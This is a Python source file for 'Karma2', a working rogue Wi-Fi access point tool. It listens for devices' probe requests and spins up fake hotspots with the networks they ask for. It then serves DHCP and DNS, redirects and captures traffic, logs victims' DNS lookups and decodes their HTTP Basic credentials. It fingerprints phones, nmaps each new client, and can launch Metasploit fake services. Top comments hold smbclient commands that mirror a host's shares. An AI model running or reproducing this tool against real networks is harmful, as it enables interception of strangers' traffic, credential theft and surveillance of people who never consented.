#!/usr/bin/env python
#smbclient //192.168.211.113/ p -L 192.168.211.113
#smbclient '\\192.168.211.113\tmp' -N -c 'prompt OFF;recurse ON;cd '/';lcd '/tmp/testsmb';mget *'
import os
from threading import Lock,Thread
import time,random,re,tempfile
import subprocess
from scapy.all import *
from select import select
import argparse
from datetime import datetime
import BaseHTTPServer
import urllib2
import json
import base64
import signal
import ssl

DEFAULT = '\033[49m\033[39m'
RED = '\033[91m'
BRED = '\033[101m'
DRED = '\033[107m\033[41m'
BLUE = '\033[94m'
DBLUE = '\033[107m\033[44m'
GREEN = '\033[92m'
DGREEN = '\033[107m\033[42m'
YELLOW = '\033[93m'

def _ctxt(txt,color):
  return ''.join((color,txt,DEFAULT))


try:
  from prctl import set_name as prctl_set_name
  from prctl import get_name as prctl_get_name
except ImportError:
  prctl_set_name = lambda x:None
  prctl_get_name = lambda :""

def set_title(name):
  """ Set the process name shown in ps, proc, or /proc/self/cmdline """
  prctl_set_name(name)

def get_title():
  """ Get the process name shown in ps, proc or /proc/self/cmdline """
  return prctl_get_name()


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-g", "--gateway", help="Choose the router IP address. Example: -g 192.168.0.1")
    parser.add_argument("-m", "--monitor", help="Choose the monitor interface")
    parser.add_argument("-e", "--enable", help="Choose the monitor interface to enable")
    parser.add_argument("-a", "--hostapds", help="List of interfaces which will be used to create aps")
    parser.add_argument("-n", "--name", help="start only this given essid with optional bssid ie myWifi,00:27:22:35:07:70")
    parser.add_argument("-f", "--framework", help="path to the metasploit console")
    parser.add_argument("-t", "--tcpdump", action='store_true', help="run tcpdump on interface")
    parser.add_argument("-o", "--offline", action='store_true', help="offline mode")
    parser.add_argument("-r", "--redirections", help="List of redirections (default is 80:8080,443:8080")
    parser.add_argument("-s", "--scan", action='store_true', help="run nmap on each new device")
    parser.add_argument("-x", "--management", help="deploy a management AP on this interface")
    parser.add_argument("-d", "--debug", action='store_true', help="debug mode")
    parser.add_argument("-u", "--uri", help="wifiScanMap sync uri")
    parser.add_argument("-b", "--forbidden", help="list of forBidden essid")
    return parser.parse_args()

def log(message):
  print "%s   %s"%(datetime.now(), message)

class Karma2:

  class Webserver(Thread):
    daemon=True
    def __init__(self, app, port = 80):
      Thread.__init__(self)
      self.app = app
      self.port = port

    def run(self):
      set_title('webserver %s'%self.port)
      print "run server on", self.port
      server_class=Karma2.HTTPServer
      handler_class=Karma2.HTTPRequestHandler
      server_address = ('', self.port)
      httpd = server_class(server_address, self.app, handler_class)
      httpd.PRE = "HTTP"
      httpd.serve_forever()

  class SSLWebserver(Webserver):
    def __init__(self, app, port = 443):
      self.PRE="HTTPS"
      Karma2.Webserver.__init__(self, app, port)

    def run(self):
      set_title('webserver %s'%self.port)
      print "run server on", self.port
      server_class=Karma2.HTTPServer
      handler_class=Karma2.HTTPRequestHandler
      server_address = ('', self.port)
      httpd = server_class(server_address, self.app, handler_class)
      httpd.PRE = "HTTPS"
      httpd.socket = ssl.wrap_socket(httpd.socket, keyfile='./key.pem', certfile='./cert.pem', server_side=True)
      httpd.serve_forever()

  class HTTPServer(BaseHTTPServer.HTTPServer):
    allow_reuse_address = True
    
    def __init__(self, server_address, app, RequestHandlerClass, bind_and_activate=True):
      BaseHTTPServer.HTTPServer.__init__(self, server_address, RequestHandlerClass, bind_and_activate)
      self.app = app
      self.PRE = ''

  class HTTPRequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):
    
    
    def log_message(self, format, *args):
      pass
    
    def _parse_url(self):
      # parse URL
      path = self.path.strip('/')
      sp = path.split('?')
      if len(sp) == 2:
          path, params = sp
      else:
          path, = sp
          params = None
      args = path.split('/')

      return path,params,args
    
    
    def do_GET(self):
      client = self.client_address[0]
      path,params,args = self._parse_url()
      host = self.headers.get('Host')
      dns = {
        'bssid': self.server.app.get_client_bssid(client),
        'host': host
        }
      self.server.app.update_dns(dns)
      fullpath =  "%s/%s"%(host,path)
      essid = ""
      try:
        essid = self.server.app.get_client_ap(client).essid
      except:
        pass
      
      protocol = _ctxt(self.server.PRE,BLUE)
      if self.server.PRE == 'HTTPS':
        protocol = _ctxt(self.server.PRE,RED)
      log( "%s %s: %s => %s"%(essid,protocol,client,fullpath) )
      for k in self.headers:
        log( "%s> %s:%s"%(_ctxt(" |\\--",BLUE),k,self.headers.get(k)) )
      
      if self.headers.get('user-agent') is not None:
          #self.headers.get('user-agent')
          pass

      http_auth = self.headers.get('Authorization')
      if http_auth is not None:
        params = http_auth.split(' ')
        if params[0] == 'Basic':
          log( "%s HTTP Basic authorization from %s to host %s: %s"%(
            _ctxt('[*]',YELLOW),
            client,
            host,
            _ctxt(base64.decodestring(params[1]), YELLOW)))
        else:
          log( "%s HTTP %s authorization from %s to host %s: %s"%(
            _ctxt('[*]',YELLOW),
            params[0],
            client,
            host,
            http_auth))

      if path == 'generate_204' or path == 'gen_204' or path == 'mobile/status.php':
        self.send_response(204)
        self.end_headers()
      elif path == 'ncsi.txt':
        self.send_response(200)
        self.end_headers()
        self.wfile.write('Microsoft NCSI')
      elif path == 'hotspot-detect.html' or path == 'library/test/success.html':
        data = '''<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
<html>
  <head>
    <title>Success</title>
  </head>
  <body>Success</body>
</html>'''
        self.send_response(200)
        self.end_headers()
        self.wfile.write(data)
      else:
        self.send_response(200)
        self.end_headers()

    def do_POST(self):
      client = self.client_address[0]
      path,params,args = self._parse_url()
      host = self.headers.get('Host')
      fullpath =  "%s%s"%(host,path)
      log( "%s => %s"%(client,fullpath) )
      try:
        authorization = self.headers.get('Authorization').split(' ')
        if authorization[0] == 'Basic':
          user_password = base64.b64decode(authorization[1])
          log( "%s login is %s"%(fullpath,user_password) )
      except:
        pass
      
      if host == 't.appsflyer.com' and path == 'api/v2.3/androidevent':
        model = self.headers.get('model')
        lang = self.headers.get('lang')
        operator = self.headers.get('operator')
        brand = self.headers.get('brand')
        country = self.headers.get('country')
        log( "%s is using a %s %s using %s. Language is %s"%(client, brand, model, operator, lang))
        
        
      self.send_response(200)
      self.end_headers()
      
  class WLANInterface:
    def __init__(self, iface):
      self.iface = iface
      self.available = True

    def str(self):
      return self.iface

  class WLANInterfaces:
    def __init__(self, ifs):
      self.ifs = [Karma2.WLANInterface(_if) for _if in ifs]

    def get_one(self):
      ifs = filter(lambda iface:iface.available, self.ifs)

      if len(ifs) == 0:
        return None

      iface = random.choice(ifs)

      iface.available = False
      return iface

    def free_one(self, _iface):
      for iface in self.ifs:
        if iface.iface == _iface.iface:
          iface.available = True
          return
      return

  class IPSubnet:
    def __init__(self, base):
      self.base = base

    def range(self):
      return "%s/24"%(self.base%254)

    def gateway(self):
      return self.base%254

    def range_upper(self):
      return self.base%100

    def range_lower(self):
      return self.base%200

  class AccessPoint(Thread):
    def __init__(self, karma, ifhostapd, essid, bssid, timeout, wpa2=None, fishing=True):
      Thread.__init__(self)
      self.essid = essid
      self.bssid = bssid
      self.karma = karma
      self.timeout = timeout
      self.wpa2 = wpa2
      self.ifhostapd = ifhostapd
      self.unused = True
      self.activity_ts = time.time()
      self.logfile = None
      self.clients = {}
      iface,self.hostapd_process = self.create_hostapd_access_point(essid, bssid, wpa2)
      subnet = self.karma.get_unique_subnet()
      self.subnet = subnet
      self.setup_iface(iface,subnet)

      self.dhcpd_process = self.start_dhcpd(iface,subnet)

      self.nmaps = []

      if self.karma.tcpdump:
        self.tcpdump_process = self.start_tcp_dump()
      else:
        self.tcpdump_process = None

      if fishing:
        # redirect the following ports
        for sport, dport in self.karma.redirections.iteritems():
          self.setup_redirections(iface,sport,dport)
        self.dnswatch_process = self.start_dnswatch(iface)

      else:
        self.dnswatch_process = None

    def start_tcp_dump(self):
      self.logfile = "wifi-%s-%s.cap"%(self.essid,datetime.now().strftime("%Y%m%d-%H%M%S"))
      log( "[+] Starting tcpdump %s"%self.logfile )
      cmd = ['tcpdump','-i', self.ifhostapd.str(), '-w', self.logfile]
      p = subprocess.Popen(cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE)
      return p
              
    
    def register_client(self, mac,ip, name = ""):
      if not self.clients.has_key(mac):
        self.clients[mac] = ip
        log( "new client %s (%s) %s"%(mac, _ctxt(ip, GREEN), name))
        if self.karma.scan:
          try:
            self.nmaps.append(self.nmap(ip))
          except:
            log( "%s Unable to start nmap %s"%(_ctxt("[!]",RED)) )
    
    def run(self):
      set_title('hostapd %s'%self.essid)
      log( "[+] now running" )
      
      def _killall():
          try:
            self.dhcpd_process.kill()
            self.dhcpd_process.wait()
          except:
            log( "%s could not kill dhcpd"%_ctxt("[!]",RED))
          try:
            self.hostapd_process.kill()
            self.hostapd_process.wait()
          except:
            log( "%s could not kill hostapd"%_ctxt("[!]",RED))
          if self.tcpdump_process is not None:
            try:
              self.tcpdump_process.kill()
              self.tcpdump_process.wait()
            except:
              log( "%s could not kill tcpdump"%_ctxt("[!]",RED))
            if self.karma.tcpdump and self.unused and not self.karma.debug:
              try:
                log( "[-] deleteting %s"%self.logfile)
                os.remove(self.logfile)
              except:
                log( "%s error deleteting %s"%((_ctxt("[!]",RED)), self.logfile))
                pass
          if self.dnswatch_process is not None:
            try:
              self.dnswatch_process.kill()
              self.dnswatch_process.wait()
            except:
              log( "%s could not kill dnswatch"%_ctxt("[!]",RED))
          
          for p in self.nmaps:
            p.kill()
            p.wait()
          
          self.karma.release_ap(self.essid)
          self.karma.ifhostapds.free_one(self.ifhostapd)
          self.karma.free_subnet(self.subnet)
      
      while True:

        # check alive
        if self.activity_ts is None:
          log( "%s Unable to create an AP for %s"%(_ctxt("[!]",RED),self.essid))
          _killall()
          return

        # check timeout
        if time.time() - self.activity_ts > self.timeout:
          log( "[x] No activity for essid %s, destroying AP"%self.essid)
          _killall()
          return

        files = []

        dhcpfd = self.dhcpd_process.stderr.fileno()
        files.append(dhcpfd)

        airfd = self.hostapd_process.stdout.fileno()
        files.append(airfd)
      
        dnswfd = -1
        if self.dnswatch_process is not None:
          dnswfd = self.dnswatch_process.stdout.fileno()
          files.append(dnswfd)

        
        #nmapsd = []
        #for n in self.nmaps:
          #nmapsd.append(n.stdout.fileno())
        #files.extend(nmapsd)
        rlist,wlist,xlist = select(files,[],[],1)
        #i = 0
        #for n in nmapsd:
          #if n in rlist:
            #line = self.nmaps[i].stdout.readline()
            #if len(line) == 0:
              #continue
          #i += 1
          
        if dhcpfd in rlist:
          line = self.dhcpd_process.stderr.readline()
          if len(line) == 0:
              continue
          #print line
          m = re.match(
            r".*failed.*", line)
          if m is not None:
            log( "%s %s"%(_ctxt("[!]",RED), line))
            #_killall()
          else:
            m = re.match(
              r".*DHCPACK\(\w+\) ([0-9\.]+) ([a-zA-Z0-9:]+) ([\w-]+).*",line)
            if m is not None:
              ip,mac,name = m.groups()
              self.register_client(mac, ip, name)
            else:
              m = re.match(
                r".*([a-zA-Z0-9:]+)*disassociated due to inactivity*",line)
              if m is not None:
                mac = m.groups()
                log( "dissociated %s"%mac)
                self.clients.pop(mac,None)

        if airfd in rlist:
          line = self.hostapd_process.stdout.readline()
          if len(line) == 0:
            continue
          m = re.match(r".*: STA ([a-zA-Z0-9:]+) IEEE 802.11: authenticated",line)
          if m is not None:
            mac, = m.groups()
            if not self.clients.has_key(mac):
              log( "Client %s associated to %s"%(_ctxt(mac,GREEN),_ctxt(self.essid,GREEN)))

            self.activity_ts = time.time()
          else:
            m = re.match(r".*: Interface (\w+) wasn't started",line)
            if m is not None:
              ifname, = m.groups()
              log( "%s Unable to start hostapd on interface %s: %s"%(_ctxt("[!]",RED),_ctxt(ifname,RED), line))
              # will remove AP from list on next check
              self.activity_ts = None  

        if dnswfd in rlist:
          line = self.dnswatch_process.stdout.readline()
          if len(line) == 0:
            continue
          dns = {}
          # only show requests
          if "CNAME" in line:
            m = re.match(
            r".* > (\w+:\w+:\w+:\w+:\w+:\w+).*CNAME*\s([a-z0-9-\.]+)\..*",line)
            if m is not None:
              mac,host = m.groups()
              dns = {
                'bssid': mac,
                'host': host
                }
          else:
            if "AAAA?" in line or "A?" in line:
              m = re.match(
              r"(\w+:\w+:\w+:\w+:\w+:\w+) >.*length \d+:\s([0-9\.]+)\.\d+.*A\?*\s([a-z0-9-\.]+)\..*",line)
              if m is not None:
                mac, ip, host = m.groups()
                dns = {
                  'bssid': mac,
                  'host': host
                  }
                self.register_client(mac,ip)
          if dns != {}: 
            if self.karma.update_dns(dns):
              log( "[+] %s => %s"%(dns['bssid'], dns['host']))

          self.activity_ts = time.time()
        time.sleep(0.5)

    def nmap(self, ip):
      log( "[+] nmapping %s"%ip)
      cmd = ['nmap', '--open', '-A', "%s"%ip]
      p = subprocess.Popen(cmd
      ,stdout=subprocess.PIPE
      ,stderr=subprocess.PIPE
      )
      return p
      

    def setup_redirections(self, iface, inport, outport):
      if self.karma.debug:
        log( "[+] Setting up (%s) %d to %d redirection"%(iface,inport,outport))
      cmd = ['iptables',
        '-t', 'nat',
        '-A', 'PREROUTING',
        '-i', iface,
        '-p', 'tcp',
        '--dport', str(inport),
        '-j', 'REDIRECT',
        '--to-port', str(outport),
        ]
      p = subprocess.Popen(cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE)
      p.wait()
      return p

    def start_dhcpd(self, iface, subnet):
      # create a temporary file
      log( "[+] Starting dhcp server %s %s"%(iface,subnet.range()))

      cmd = ['dnsmasq',
        '-d',
        '--log-dhcp',
        '--bind-dynamic',
        '--log-facility=-',
        '-i', iface,
        '-F', '%s,%s'%(subnet.range_lower(),subnet.range_upper()),
        '--dhcp-option=option:router,%s'%(subnet.gateway()),
        '--dhcp-option=option:dns-server,%s'%(subnet.gateway()),
      ]
      if(self.karma.offline):
        cmd.append('-R')
        cmd.append('--address=/#/%s'%(subnet.gateway()))
      p = subprocess.Popen(cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE)
      return p

    def setup_iface(self, iface, subnet):
      log( "[+] Uping iface %s w/ subnet %s"%(iface,subnet.range()))
      iprange = "%s"%subnet.range()
      cmd = ["ifconfig",iface,iprange]
      p = subprocess.Popen(cmd)
      p.wait()

    def start_dnswatch(self, iface):
      cmd = ["tcpdump","-i",iface,"-e","-s0","-l","-t","-n","udp","port","53"]
      p = subprocess.Popen(cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE)
      return p

    def create_hostapd_access_point(self, essid, bssid, wpa2):
      bssid_text = ""
      if bssid is not None:
        bssid_text = " with bssid %s"%bssid
      log( "[+] Creating (hostapd) AP %s %s"%(_ctxt(essid,GREEN),bssid_text))

      interface = self.ifhostapd.str()
      channel = random.randint(1,11)

      f = tempfile.NamedTemporaryFile(delete=False)
      f.write("ssid=%s\n"%(essid))
      if bssid is not None:
        f.write("bssid=%s\n"%(bssid))
      f.write("interface=%s\n"%(interface))
      f.write("channel=%s\n"%(channel))
      #f.write("ignore_broadcast_ssid=1")
      if wpa2 is not None:
        f.write("wpa=2\n")
        f.write("wpa_passphrase=%s\n"%wpa2)
        f.write("wpa_key_mgmt=WPA-PSK\n")
        f.write("wpa_pairwise=CCMP\n")
        f.write("rsn_pairwise=CCMP\n")
      f.close()
      cmd = ["hostapd","-d",f.name]
      p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
      return interface,p

    def create_airbase_access_point(self, essid):
      log( "[+] Creating (airbase) AP %s"%essid)
      cmd = ["airbase-ng",
        "--essid", "%s"%essid,
        "-c","4",
        "-I","2000",
        self.karma.ifmon]
      p = subprocess.Popen(cmd, stdout=subprocess.PIPE)

      while True:
        line = p.stdout.readline()
        m = re.match(r".*Created tap interface (\w+)",line)
        if m is not None:
          iface, = m.groups()
          return iface,p

  def __init__(self, ifgw, ifmon, ifhostapds = None, metasploit = None, tcpdump = None, redirections = None, offline = False, scan = False, debug = False, uri = None, forbidden = ()):
    self.ifmon = ifmon
    self.ifgw = ifgw
    self.ifhostapds = Karma2.WLANInterfaces(ifhostapds)
    self.aps = {}
    self.subnets = set(xrange(50,256)) 
    self.clear_iptables()
    self.offline = offline
    self.tcpdump = tcpdump
    self.scan = scan
    self.debug = debug
    self.uri = uri
    self.locals_interfaces = self.getWirelessInterfacesList()
    self.forbidden_aps = forbidden
    if not offline:
      self.setup_nat(ifgw)
    
    self.redirections = {80:8080, 443:8081}
    if redirections is not None:
      r = redirections.split(',')
      for re in r:
        sport, dport = re.split(':')
        self.redirections[int(sport)] = int(dport)
        
    if metasploit is not None:
      self.start_metasploit(metasploit)
  
  def get_client_ap(self,ip):
    for essid,ap in self.aps.iteritems():
      for m,c in ap.clients.iteritems():
        if c == ip:
          return ap

  def get_client_bssid(self, ip):
    for essid,ap in self.aps.iteritems():
      for m,c in ap.clients.iteritems():
        if c == ip:
          return m
  
  def update_dns(self, dns):
    try:
      req = urllib2.Request('%s/users.json'%self.uri)
      req.add_header('Content-Type', 'application/json')
      response = urllib2.urlopen(req, json.dumps(dns, ensure_ascii=False))
    except:
      log( "could not update dns")
  
  def start_metasploit(self, console):
    log( "[+] Starting metasploit")
    cmd = [console,'-r', 'run_fake_services.rb']
    p = subprocess.Popen(cmd, stdin=subprocess.PIPE)

  def clear_iptables(self):
    log( "[+] Clearing iptables rules")
    cmd = ['iptables','-F']
    p = subprocess.Popen(cmd, stdout=subprocess.PIPE)
    p.wait()

    cmd = ['iptables','-t','nat','-F']
    p = subprocess.Popen(cmd, stdout=subprocess.PIPE)
    p.wait()

  def setup_nat(self, iface):
    log( "[+] Setting up NAT on %s"%iface)
    cmd = ["iptables", 
      "-t","nat",
      "-A","POSTROUTING",
      "-o",iface,
      "-j","MASQUERADE"]
    p = subprocess.Popen(cmd, stdout=subprocess.PIPE)
    p.wait()

  def get_unique_subnet(self):
    a = self.subnets.pop()
    return Karma2.IPSubnet("10.0.%d.%%d"%a)

  def free_subnet(self, subnet):
    self.subnets.add(subnet.base)

  def register_ap(self, essid, ap):
    self.aps[essid] = ap

  def release_ap(self, essid):
    self.aps.pop(essid)

  def create_mgmt_ap(self, iface):
    essid = "mgmt"
    ap = self.AccessPoint(self, 
      Karma2.WLANInterface(iface),
      essid, None, 365*24*3600,
      wpa2="glopglopglop",
      fishing=False)
    ap.daemon = True
    ap.start()

  def create_ap(self, essid, bssid = None, timeout = 30):
    iface = self.ifhostapds.get_one()
    if iface is None:
      return
    ap = self.AccessPoint(self, iface, essid, bssid, timeout)
    self.register_ap(essid,ap)
    ap.daemon = True
    ap.start()

  def process_probe(self, essid, bssid = None):
    if (not essid in self.aps.keys()
            and not essid in self.forbidden_aps):
            self.create_ap(essid, bssid)
  
  def getWirelessInterfacesList(self):
    networkInterfaces=[]		
    command = ["iwconfig"]
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    process.wait()
    (stdoutdata, stderrdata) = process.communicate();
    output = stdoutdata
    lines = output.splitlines()
    for line in lines:
      if(line.find("IEEE 802.11")!=-1):
        networkInterfaces.append(line.split()[0])
    return networkInterfaces
  
  def do_sniff(self):
    if 'http' in self.ifmon:
      while True:
        try:
          req = urllib2.Request("%s/status.json"%self.ifmon)
          f = urllib2.urlopen(req)
          data = f.read()
          j =  json.loads(data)
          for p in j['current']['probes']:
            bssid = None
            try:
              bssid = p['ap'][0]['bssid']
            except:
              pass
            found = False
            for w in j['current']['wifis']:
              if p['essid'] == w['essid']:
                found = True
                break
            if not found:
              if not p['bssid'] in self.locals_interfaces:
                self.process_probe(p['essid'], bssid)
        except Exception as e:
          log( "Probes %s"%e)
        time.sleep(0.5)
    else:
      def _filter(packet):
        if packet.haslayer(Dot11ProbeReq):
          section = packet[Dot11ProbeReq][Dot11Elt]
          # SSID
          if section.ID == 0 and section.info != '':
            self.process_probe(section.info)
      
      sniff(prn=_filter,store=0)

  def start_webserver(self, km, port, ssl_port):
    ws = Karma2.Webserver(km, port)
    ws.start()
    wss = Karma2.SSLWebserver(km, ssl_port)
    wss.start()


  def status(self, signum, stack):
    print "==========="
    for essid,ap in self.aps.iteritems():
      print "%s => %s (%s), inactive for %ss/%ss"%(ap.ifhostapd.iface, ap.essid, len(ap.clients), int((time.time() - ap.activity_ts), int(ap.timeout)))
      for mac,ip in ap.clients.iteritems():
        print "\t%s => %s"%(mac,ip)

if __name__ == '__main__':


  from distutils.spawn import find_executable

  CHECK_EXECUTABLES = (
    'hostapd','nmap','iptables','tcpdump','dnsmasq','airmon-ng',
  )

  # check for executables
  do_not_run = False
  for exe in CHECK_EXECUTABLES:
    if find_executable(exe) is None:
      log( "[x] %s does not seems to be installed (and needed)"%_ctxt(exe, RED))
      do_not_run = True
  if do_not_run:
    sys.exit(-1)

  # parse command line
  args = parse_args()
  if args.enable is not None:
    cmd = ['airmon-ng','start',args.enable]
    p = subprocess.Popen(cmd,
      stdout=subprocess.PIPE,
      stderr=subprocess.PIPE)

    log( "[+] Starting monitor mode on %s"%args.enable)
    p.wait()

    lines = p.stdout.read()
    m = re.match(r".*monitor mode enabled on (\w+).*", lines, re.S)
    if m is not None:
      iface, = m.groups()
      log( "[+] Monitor interface %s created"%iface)
      args.monitor = iface

  try:
    args.hostapds = args.hostapds.split(',')

    forbidden = ()
    if args.forbidden is not None:
     forbidden = args.forbidden.split(',')
    km = Karma2(args.gateway, args.monitor, args.hostapds, args.framework, args.tcpdump, args.redirections, args.offline, args.scan, args.debug, args.uri, forbidden)
    signal.signal(signal.SIGUSR1, km.status)
    signal.signal(signal.SIGUSR2, km.status)
    
    if args.offline:
      km.start_webserver(km, km.redirections[80], km.redirections[443])

    if args.name is not None:
      # 24h timeout
      essid = args.name.split(',')[0]
      bssid = None
      try:
        bssid = args.name.split(',')[1]
      except:
        pass
      km.create_ap(essid, bssid, 60*60*24)
    else:
      km.do_sniff()

    while True:
      time.sleep(1)

  except KeyboardInterrupt:
    pass
  finally:

    if args.enable is not None:
      log( "[+] Stopping monitor interface %s properly"%args.monitor)
      cmd = ['airmon-ng','stop',args.monitor]
      p = subprocess.Popen(cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE)
      p.wait()

